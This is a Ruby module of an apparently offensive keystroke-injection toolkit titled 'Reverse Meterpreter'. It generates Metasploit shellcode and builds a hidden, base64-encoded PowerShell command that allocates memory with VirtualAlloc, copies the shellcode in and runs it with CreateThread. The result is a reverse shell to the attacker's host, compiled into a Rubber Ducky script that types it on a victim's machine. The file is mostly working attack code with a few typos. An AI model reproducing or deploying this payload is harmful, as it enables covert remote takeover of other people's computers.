#!/usr/bine/env ruby
require 'skeleton'
require 'metasploit'
class ReverseMeterpreter < Skeleton
  include Msf
  attr_reader :ducky
  self.title = 'Reverse Meterpreter'
  self.description = 'Execute Meterpreter shellcode from memory'

  def setup
    @msf = Msf::MsfCommands.new
    @payload = @msf.payload_select
    @msf_host = @msf.host
    @msf_post = @msf.port
  end

  def run
    @shellcode = @msf.generate_shellcode(@msf_host, @msf_port, @payload)
  end

  def finish
    priv_choice = @ducky_writer.menu
    File.open("#{text_path}#{self.class.title}.txt", 'w') do |f|
      f.write(@ducky_writer.write(priv_choice))
      f.write(powershell_command(
              powershell_command2(@shellcode).encode_command))
    end
    Ducky::Compile.new("#{self.class.title}.txt")
    @msf.start(@msf_host, @msf_port) if @msf.start_metasploit?
  end

  def powershell_command(encoded_command)
    str = 'STRING powershell -nop -wind hidden -noni -enc '
    str << "#{encoded_command}\n"
    str << 'ENTER'
  end

  def powershell_command2(shellcode)
    s = %($1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr )
    s << 'VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, '
    s << "uint flProtect);[DllImport(\"kernel32.dll\")]public static extern "
    s << 'IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, '
    s << 'IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, '
    s << "IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern "
    s << "IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type "
    s << %(-memberDefinition $c -Name "Win32" -namespace Win32Functions )
    s << "-passthru;[Byte[]];[Byte[]]$sc = #{shellcode};$size = 0x1000;if "
    s << '($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::'
    s << 'VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);'
    s << '$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::'
    s << "CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$gq = "
    s << '[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.'
    s << 'GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + '
    s << %("\\syswow64\\WindowsPowerShell\\v1.0\\powershell";$cmd = "-nop )
    s << %(-noni -enc";iex "& $x86 $cmd $gq"}else{$cmd = "-nop -noni -enc";)
    s << %(iex "& powershell $cmd $gq";})
  end
end
